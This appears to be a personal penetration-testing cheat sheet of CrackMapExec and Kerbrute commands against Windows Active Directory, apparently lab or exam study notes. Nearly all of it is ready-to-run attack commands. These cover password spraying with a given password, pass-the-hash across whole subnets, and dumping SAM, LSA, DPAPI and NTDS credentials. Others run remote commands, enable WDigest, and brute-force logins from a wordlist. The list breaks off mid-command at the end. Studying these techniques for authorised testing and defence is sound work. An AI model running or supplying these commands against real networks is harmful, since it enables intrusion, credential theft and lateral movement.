```c
cme winrm 172.16.211.0/24 -u "Joe" -p "Flowers1"
```

```c
# see the password policy using machine name and hash
crackmapexec smb 192.168.221.75 -u MS01$ -H <HASHHASHHASHHASHHASHHASH> -d corp.com --pass-pol

#see domain users use machine name and hash
crackmapexec smb 192.168.221.75 -u MS01$ -H <HASHHASHHASHHASHHASHHASH> --users --explort $(pwd)/users.txt
```

```c
#get shares and see if a box is pwned for smb
crackmapexec smb 192.168.221.75 -u tom.green -H <HASHHASHHASHHASHHASHHASH> --shares
```

```c
crackmapexec smb 192.168.221.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

![[Pasted image 20231113192855.png]]

*Pwned means you have a local admin*
![[Pasted image 20231113192950.png]]

*find which machines within subnet you are local admin on with known good creds*
![[Pasted image 20231113193338.png]]
#### Kerbrute
*use this on target machine, though it is cross platform*
```c
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```



```c
crackmapexec ldap -L
crackmapexec mysql -L
crackmapexec smb -L
crackmapexec ssh -L
crackmapexec winrm -L
```

```c
crackmapexec smb <RHOST> -u '' -p '' --shares
crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
crackmapexec smb <RHOST> -u " " -p "" --shares
crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
crackmapexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
crackmapexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
crackmapexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
crackmapexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share
```

```c
#Execute 'whoami'  
crackmapexec 192.168.1.5 -u Administrator -p 'PASS' -x whoami  
#Show Domain Administrators.  
crackmapexec 192.168.1.5 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec  
#PS Version Table:  
crackmapexec 192.168.1.5 -u Administrator -p 'PASS' -X '$PSVersionTable'  
#List out Machine Users.  
crackmapexec 192.168.1.5 -u 'Administrator' -p 'PASS' --lusers  
#Dump SAM Database.  
crackmapexec 192.168.1.0/24 -u 'Administrator' -p 'PASS' --local-auth --sam  
#Lets _Pass The Hash_ _against an entire subnet!_  
crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H 'LM:NTLM' --local-auth
```